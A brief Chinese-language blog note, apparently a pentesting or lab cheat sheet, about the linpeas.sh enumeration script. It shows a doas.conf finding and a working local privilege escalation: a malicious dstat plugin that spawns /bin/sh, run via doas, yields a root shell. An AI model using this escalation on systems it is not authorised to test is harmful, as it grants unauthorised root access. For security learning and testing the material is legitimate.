---
title: "linpeas.sh"
date: 2023-03-09
draft: false
---
因linpeas.sh更新频繁

记得随用随下载：

[linpeas.sh](https://github.com/carlospolop/PEASS-ng/releases/)

<!--more-->


------------

### doas

`╔══════════╣ Checking doas.conf`
`permit nopass player as root cmd /usr/bin/dstat`

参考 <https://gtfobins.github.io/gtfobins/dstat/>

```bash
$ cd /usr/local/share/dstat/
$ echo 'import os; os.execv("/bin/sh", ["sh"])' >dstat_xxx.py
$ doas -u root /usr/bin/dstat --xxx
# id
uid=0(root) gid=0(root) groups=0(root)

```

